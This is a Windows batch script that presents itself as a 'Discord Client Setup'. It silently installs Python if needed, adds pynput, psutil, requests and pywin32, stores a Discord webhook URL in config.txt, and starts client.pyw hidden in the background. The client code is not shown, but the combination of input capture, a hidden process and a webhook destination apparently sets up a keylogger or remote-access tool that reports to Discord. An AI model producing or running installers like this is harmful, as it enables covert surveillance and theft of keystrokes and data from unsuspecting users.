@echo off
title Discord Client Setup
color 0A

REM ===========================
REM Step 1: Check for Python
REM ===========================
python --version >nul 2>&1
IF ERRORLEVEL 1 (
    echo [*] Python not found. Installing Python 3.12...
    powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe -OutFile python_installer.exe"
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python_installer.exe
) ELSE (
    echo [+] Python is already installed.
)

REM ===========================
REM Step 2: Install requirements
REM ===========================
echo [*] Installing required Python packages...
python -m pip install --upgrade pip
python -m pip install pynput psutil requests pywin32

REM ===========================
REM Step 3: Ask for Discord webhook
REM ===========================
set /p WEBHOOK=Enter your Discord webhook URL: 
echo %WEBHOOK% > config.txt
echo [+] Webhook saved to config.txt

REM ===========================
REM Step 4: Start hidden client
REM ===========================
start "" pythonw client.pyw
echo [+] Client started in background.
pause
